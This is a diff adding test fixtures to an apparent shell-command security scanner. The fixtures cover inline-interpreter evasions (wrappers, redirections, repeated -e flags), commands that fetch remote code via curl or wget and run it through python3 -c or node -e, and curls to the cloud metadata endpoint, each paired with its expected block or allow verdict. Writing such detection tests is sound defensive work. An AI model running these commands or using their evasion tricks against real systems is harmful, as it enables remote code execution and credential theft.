@@ -1674,6 +1674,551 @@ expected_action = "allow"
 expected_rules = []
 forbidden_rules = ["interpreter_suspicious_inline_exec"]
 
+# Inline source after options the role parser must read past, redirections,
+# clustered short options, wrappers, and a word list the dataflow splitter
+# rejects (a trailing backslash). None of these may hide the payload.
+
+[[fixture]]
+name = "inline_node_title_value"
+min_milestone = 1
+input = "node --title x -e \"require('child_process').execSync('id')\""
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "inline_node_conditions_short_value"
+min_milestone = 1
+input = "node -C development -e \"require('child_process').execSync('id')\""
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "inline_node_input_type_value"
+min_milestone = 1
+input = "node --input-type module -e \"require('child_process').execSync('id')\""
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "inline_node_experimental_loader_value"
+min_milestone = 1
+input = "node --experimental-loader ./loader.mjs -e \"require('child_process').execSync('id')\""
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "inline_node_inspect_port_value"
+min_milestone = 1
+input = "node --inspect-port 9230 -e \"require('child_process').execSync('id')\""
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "inline_node_v8_stack_size_value"
+min_milestone = 1
+input = "node --stack-size 2000 -e \"require('child_process').execSync('id')\""
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "inline_node_unknown_option_value"
+min_milestone = 1
+input = "node --unlisted-option value -e \"require('child_process').execSync('id')\""
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "inline_ruby_chdir_value"
+min_milestone = 1
+input = "ruby -C /tmp -e \"system('id')\""
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "inline_ruby_encoding_short_value"
+min_milestone = 1
+input = "ruby -E UTF-8 -e \"system('id')\""
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "inline_ruby_encoding_long_value"
+min_milestone = 1
+input = "ruby --encoding UTF-8 -e \"system('id')\""
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "inline_bun_cwd_value"
+min_milestone = 1
+input = "bun --cwd /tmp -e \"require('child_process').execSync('id')\""
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "inline_python_redirect_before_flag"
+min_milestone = 1
+input = "python3 2>/dev/null -c \"import os; os.system('id')\""
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "inline_node_fd_dup_before_flag"
+min_milestone = 1
+input = "node 2>&1 -e \"require('child_process').execSync('id')\""
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "inline_python_redirect_before_command"
+min_milestone = 1
+input = "2>/dev/null python3 -c \"import os; os.system('id')\""
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "inline_python_redirect_joined_to_command"
+min_milestone = 1
+input = "python3>/dev/null -c \"import os; os.system('id')\""
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "inline_python_separate_redirect_target"
+min_milestone = 1
+input = "python3 2> /tmp/err -c \"import os; os.system('id')\""
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "inline_python_trailing_backslash"
+min_milestone = 1
+input = "python3 -c \"import os; os.system('id')\" \\"
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "inline_python_trailing_backslash_second_segment"
+min_milestone = 1
+input = "echo hi; python3 -c \"import os; os.system('id')\" \\"
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "inline_python_clustered_safe_path_flag"
+min_milestone = 1
+input = "python3 -Pc \"import os; os.system('id')\""
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "inline_python_clustered_warning_value"
+min_milestone = 1
+input = "python3 -uW ignore -c \"import os; os.system('id')\""
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "inline_perl_clustered_line_flag"
+min_milestone = 1
+input = "perl -le 'system(\"id\")'"
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "inline_perl_clustered_loop_flags"
+min_milestone = 1
+input = "perl -lne 'system(\"id\")'"
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "inline_ruby_clustered_warning_flag"
+min_milestone = 1
+input = "ruby -we 'system(\"id\")'"
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "inline_ruby_disable_value"
+min_milestone = 1
+input = "ruby --disable gems -e \"system('id')\""
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "inline_python_sudo_user_wrapper"
+min_milestone = 1
+input = "sudo -u nobody python3 -c \"import os; os.system('id')\""
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "inline_python_env_wrapper"
+min_milestone = 1
+input = "env LANG=C python3 -c \"import os; os.system('id')\""
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "inline_python_nice_wrapper"
+min_milestone = 1
+input = "nice -n 5 python3 -c \"import os; os.system('id')\""
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "inline_python_timeout_wrapper"
+min_milestone = 1
+input = "timeout 10 python3 -c \"import os; os.system('id')\""
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "inline_python_command_wrapper"
+min_milestone = 1
+input = "command python3 -c \"import os; os.system('id')\""
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "inline_python_exec_wrapper"
+min_milestone = 1
+input = "exec python3 -c \"import os; os.system('id')\""
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "inline_python_nohup_wrapper"
+min_milestone = 1
+input = "nohup python3 -c \"import os; os.system('id')\""
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "inline_node_title_value_benign_no_fire"
+min_milestone = 1
+input = "node --title x -e 'console.log(1)'"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "inline_python_redirect_benign_no_fire"
+min_milestone = 1
+input = "python3 2>/dev/null -c 'print(1)'"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "inline_python_trailing_backslash_benign_no_fire"
+min_milestone = 1
+input = "python3 -c 'print(1)' \\"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "inline_perl_clustered_benign_no_fire"
+min_milestone = 1
+input = "perl -lne 'print' file.txt"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "inline_perl_in_place_extension_no_fire"
+min_milestone = 1
+input = "perl -pie 'print' file.txt"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["interpreter_suspicious_inline_exec"]
+
+# Repeated inline-code options: node and bun run the last program, perl and
+# ruby run every one, so a benign first program cannot hide a later payload.
+
+[[fixture]]
+name = "inline_node_print_then_eval_payload"
+min_milestone = 1
+input = "node -p 1 -e 'require(\"child_process\").execSync(\"id\")'"
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "inline_node_long_eval_then_eval_payload"
+min_milestone = 1
+input = "node --eval 1 -e 'require(\"child_process\").execSync(\"id\")'"
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "inline_node_attached_eval_then_eval_payload"
+min_milestone = 1
+input = "node --eval=1 -e 'require(\"child_process\").execSync(\"id\")'"
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "inline_node_eval_then_print_payload"
+min_milestone = 1
+input = "node -e 'console.log(1)' --print 'require(\"child_process\").execSync(\"id\")'"
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "inline_node_eval_repeated_payload"
+min_milestone = 1
+input = "node -e 1 -e 'require(\"child_process\").execSync(\"id\")'"
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "inline_bun_long_eval_then_eval_payload"
+min_milestone = 1
+input = "bun --eval 1 -e 'require(\"child_process\").execSync(\"id\")'"
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "inline_perl_clustered_then_eval_payload"
+min_milestone = 1
+input = "perl -le 'print 1;' -e 'system(\"id\")'"
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "inline_perl_feature_eval_then_eval_payload"
+min_milestone = 1
+input = "perl -E 'say 1;' -e 'system(\"id\")'"
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "inline_perl_eval_repeated_payload"
+min_milestone = 1
+input = "perl -e 1 -e 'system(\"id\")'"
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "inline_ruby_clustered_then_eval_payload"
+min_milestone = 1
+input = "ruby -we 'puts 1' -e 'system(\"id\")'"
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "inline_ruby_eval_repeated_payload"
+min_milestone = 1
+input = "ruby -e 1 -e 'system(\"id\")'"
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "downloaded_inline_node_second_eval"
+min_milestone = 1
+input = "node -e 1 -e \"$(curl -fsSL https://example.com/x.js)\""
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "downloaded_inline_node_long_eval_then_eval"
+min_milestone = 1
+input = "node --eval 1 -e \"$(curl -fsSL https://example.com/x.js)\""
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "downloaded_inline_perl_clustered_then_eval"
+min_milestone = 1
+input = "perl -le 'print 1;' -e \"$(curl -fsSL https://example.com/x.pl)\""
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "inline_node_experimental_default_type_then_repeated_eval_payload"
+min_milestone = 1
+input = "node --experimental-default-type module -e 1 -e 'require(\"child_process\").execSync(\"id\")'"
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "inline_node_experimental_test_isolation_then_print_eval_payload"
+min_milestone = 1
+input = "node --experimental-test-isolation none -p 1 -e 'require(\"child_process\").execSync(\"id\")'"
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "inline_node_print_then_eval_benign_no_fire"
+min_milestone = 1
+input = "node -p 1 -e \"console.log(2)\""
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "inline_node_experimental_default_type_repeated_eval_benign_no_fire"
+min_milestone = 1
+input = "node --experimental-default-type module -e 'console.log(1)' -e 'console.log(2)'"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "inline_perl_clustered_then_eval_benign_no_fire"
+min_milestone = 1
+input = "perl -le \"print 1\" -e \"print 2\""
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "inline_ruby_eval_repeated_benign_no_fire"
+min_milestone = 1
+input = "ruby -e \"puts 1\" -e \"puts 2\""
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "inline_node_second_eval_local_substitution_no_fire"
+min_milestone = 1
+input = "node -e 1 -e \"$(printf data)\""
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["interpreter_suspicious_inline_exec"]
+
+# Python ends option parsing at -c: later words are the program's argv.
+[[fixture]]
+name = "inline_python_second_c_is_argv_no_fire"
+min_milestone = 1
+input = "python3 -c \"print(1)\" -c x"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["interpreter_suspicious_inline_exec"]
+
+# Downloaded inline source reaching stdout through a device file (`-o /dev/stdout`,
+# `> /dev/stdout`, `wget -O /dev/stdout`), a URL given before `--remote-name-all`,
+# or a curl config file whose URLs argv cannot show.
+
+[[fixture]]
+name = "downloaded_inline_curl_output_dev_stdout"
+min_milestone = 1
+input = "python3 -c \"$(curl -o /dev/stdout https://example.com/x.py)\""
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "downloaded_inline_curl_redirect_dev_stdout"
+min_milestone = 1
+input = "python3 -c \"$(curl https://example.com/x.py > /dev/stdout)\""
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "downloaded_inline_wget_output_dev_stdout"
+min_milestone = 1
+input = "python3 -c \"$(wget -O /dev/stdout https://example.com/x.py)\""
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "downloaded_inline_curl_remote_name_all_after_url"
+min_milestone = 1
+input = "python3 -c \"$(curl https://example.com/x.py --remote-name-all)\""
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "downloaded_inline_curl_config_file"
+min_milestone = 1
+input = "python3 -c \"$(curl -K /tmp/curl.cfg)\""
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "downloaded_inline_curl_output_dev_stderr_no_fire"
+min_milestone = 1
+input = "python3 -c \"$(curl -o /dev/stderr https://example.com/x.py; printf 'print(1)')\""
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "downloaded_inline_curl_remote_name_all_before_url_no_fire"
+min_milestone = 1
+input = "python3 -c \"$(curl --remote-name-all https://example.com/x.py; printf 'print(1)')\""
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["interpreter_suspicious_inline_exec"]
+
 # ── M5 chunk 1: PowerShell-specific rules ───────────────────────────────
 
 [[fixture]]
@@ -3189,3 +3734,321 @@ input = "curl http://3232235796/"
 context = "exec"
 expected_action = "block"
 expected_rules = ["plain_http_to_sink", "private_network_access"]
+
+# Download provenance matters when a substitution supplies inline source, not
+# when a fixed program receives fetched bytes in ordinary data arguments.
+[[fixture]]
+name = "python_downloaded_inline_source"
+min_milestone = 1
+input = 'python3 -c "$(curl -s https://get.example.com/x.py)"'
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "node_downloaded_inline_source"
+min_milestone = 1
+input = 'node -e "$(curl -s https://get.example.com/x.js)"'
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "wrapped_python_downloaded_inline_source"
+min_milestone = 1
+input = 'env LANG=C python3 -u -c "$(command curl https://example.com/x.py)"'
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "node_attached_eval_downloaded_inline_source"
+min_milestone = 1
+input = 'node --eval="$(curl https://example.com/x.js)"'
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "node_shell_wrapper_downloaded_inline_source"
+min_milestone = 1
+input = "sh -c 'node -e \"$(curl https://example.com/x.js)\"'"
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "wget_downloaded_inline_python_source"
+min_milestone = 1
+input = 'python3 -c "$(wget -qO- https://example.com/x.py)"'
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "fetch_schemeless_downloaded_inline_python_source"
+min_milestone = 1
+input = 'python3 -c "$(fetch -o - example.com/x.py)"'
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "fixed_python_program_with_fetched_data_argument"
+min_milestone = 1
+input = "python3 -c 'import sys; print(sys.argv[1])' \"$(curl https://example.com/data)\""
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["interpreter_suspicious_inline_exec", "curl_pipe_shell", "pipe_to_interpreter"]
+
+[[fixture]]
+name = "fixed_node_program_with_fetched_data_argument"
+min_milestone = 1
+input = "node -e 'console.log(process.argv[1])' \"$(curl https://example.com/data)\""
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "printed_curl_text_is_not_downloaded_inline_source"
+min_milestone = 1
+input = "node -e 'console.log(\"curl https://example.com/x.js\")'"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "curl_substitution_without_interpreter_execution"
+min_milestone = 1
+input = 'printf %s "$(curl https://example.com/data)"'
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "curl_single_slash_metadata"
+min_milestone = 1
+input = "curl http:/169.254.169.254/latest/meta-data/"
+context = "exec"
+expected_action = "block"
+expected_rules = ["metadata_endpoint", "plain_http_to_sink", "raw_ip_url"]
+
+[[fixture]]
+name = "curl_double_slash_metadata"
+min_milestone = 1
+input = "curl http://169.254.169.254/latest/meta-data/"
+context = "exec"
+expected_action = "block"
+expected_rules = ["metadata_endpoint", "plain_http_to_sink", "raw_ip_url"]
+
+[[fixture]]
+name = "curl_triple_slash_metadata"
+min_milestone = 1
+input = "curl http:///169.254.169.254/latest/meta-data/"
+context = "exec"
+expected_action = "block"
+expected_rules = ["metadata_endpoint", "plain_http_to_sink", "raw_ip_url"]
+
+[[fixture]]
+name = "curl_single_slash_https_public_control"
+min_milestone = 1
+input = "curl https:/example.com/health"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["metadata_endpoint", "plain_http_to_sink", "schemeless_to_sink"]
+
+[[fixture]]
+name = "curl_triple_slash_https_public_control"
+min_milestone = 1
+input = "curl https:///example.com/health"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["metadata_endpoint", "plain_http_to_sink", "schemeless_to_sink"]
+
+[[fixture]]
+name = "curl_single_slash_plain_lan_control"
+min_milestone = 1
+input = "curl http:/192.168.1.20/status"
+context = "exec"
+expected_action = "warn"
+expected_rules = ["private_network_access", "plain_http_to_sink"]
+forbidden_rules = ["metadata_endpoint"]
+
+[[fixture]]
+name = "curl_uri_looking_path_is_not_a_second_destination"
+min_milestone = 1
+input = "sh -c 'curl https:/example.com/path/http://169.254.169.254/x'"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["metadata_endpoint", "raw_ip_url", "plain_http_to_sink"]
+
+[[fixture]]
+name = "curl_single_slash_metadata_header_is_not_a_destination"
+min_milestone = 1
+input = "curl --header 'http:/169.254.169.254/x' https://example.com/"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["metadata_endpoint"]
+
+[[fixture]]
+name = "npm_view_literal_version_full_inert_command"
+min_milestone = 1
+input = "npm view vitest@4.1.11 version --registry=https://registry.npmjs.org/ --userconfig=/qualification/empty.npmrc --globalconfig=/qualification/empty.npmrc --cache=/qualification/npm-cache --fetch-retries=1 --ignore-scripts --no-audit --no-fund"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["raw_ip_url", "schemeless_to_sink"]
+
+[[fixture]]
+name = "npm_info_quoted_literal_version"
+min_milestone = 1
+input = "npm info 'vitest@4.1.11' version"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["raw_ip_url", "schemeless_to_sink"]
+
+[[fixture]]
+name = "npm_show_wrapped_literal_version"
+min_milestone = 1
+input = "env -S 'npm show vitest@4.1.11 version'"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["raw_ip_url", "schemeless_to_sink"]
+
+[[fixture]]
+name = "npm_v_wrapped_literal_version"
+min_milestone = 1
+input = "command npm v vitest@4.1.11 version"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["raw_ip_url", "schemeless_to_sink"]
+
+[[fixture]]
+name = "npm_metadata_actual_registry_ip_stays_visible"
+min_milestone = 1
+input = "npm view vitest@4.1.11 version --registry=https://4.1.0.11/"
+context = "exec"
+expected_action = "warn"
+expected_rules = ["raw_ip_url"]
+
+[[fixture]]
+name = "npm_metadata_actual_url_stays_visible"
+min_milestone = 1
+input = "npm view https://4.1.0.11/package.tgz version"
+context = "exec"
+expected_action = "warn"
+expected_rules = ["raw_ip_url"]
+
+[[fixture]]
+name = "npm_metadata_named_url_stays_visible"
+min_milestone = 1
+input = "npm info vitest@https://4.1.0.11/package.tgz version"
+context = "exec"
+expected_action = "warn"
+expected_rules = ["raw_ip_url"]
+
+[[fixture]]
+name = "env_split_git_scp_uri_looking_path_keeps_outer_remote"
+min_milestone = 1
+input = "env -S 'git clone git@github.com:http://4.1.0.11/repo.git'"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["raw_ip_url", "schemeless_to_sink"]
+
+[[fixture]]
+name = "curl_user_agent_output_looking_value_does_not_hide_inline_source"
+min_milestone = 1
+input = "python3 -c \"$(curl --user-agent '-o/tmp/unused' https://example.com/x.py)\""
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "curl_remote_name_covers_only_one_inline_download_slot"
+min_milestone = 1
+input = 'python3 -c "$(curl -O https://example.com/data.txt https://example.com/x.py)"'
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "curl_next_resets_remote_name_all_before_inline_download"
+min_milestone = 1
+input = 'python3 -c "$(curl --remote-name-all https://example.com/data.txt --next https://example.com/x.py)"'
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "curl_short_next_resets_remote_name_all_before_inline_download"
+min_milestone = 1
+input = 'python3 -c "$(curl --remote-name-all https://example.com/data.txt -: https://example.com/x.py)"'
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "curl_proxy_peer_is_not_an_extra_inline_download_transfer"
+min_milestone = 1
+input = "python3 -c \"$(curl --proxy https://proxy.example -o /tmp/example.py https://example.com/x.py; printf 'print(1)')\""
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "curl_doh_peer_is_not_an_extra_inline_download_transfer"
+min_milestone = 1
+input = "python3 -c \"$(curl --doh-url https://dns.example/dns-query -o /tmp/example.py https://example.com/x.py; printf 'print(1)')\""
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "curl_user_agent_stdout_looking_value_does_not_override_file_output"
+min_milestone = 1
+input = "python3 -c \"$(curl --user-agent '-o-' -o /tmp/example.py https://example.com/x.py; printf 'print(1)')\""
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "curl_remote_name_all_keeps_every_download_out_of_inline_source"
+min_milestone = 1
+input = "python3 -c \"$(curl --remote-name-all https://example.com/a.py https://example.com/b.py; printf 'print(1)')\""
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "curl_each_remote_name_slot_keeps_downloads_out_of_inline_source"
+min_milestone = 1
+input = "python3 -c \"$(curl -O https://example.com/a.py -O https://example.com/b.py; printf 'print(1)')\""
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "curl_each_next_group_file_output_keeps_downloads_out_of_inline_source"
+min_milestone = 1
+input = "python3 -c \"$(curl --remote-name-all https://example.com/a.py --next -O https://example.com/b.py; printf 'print(1)')\""
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["interpreter_suspicious_inline_exec"]
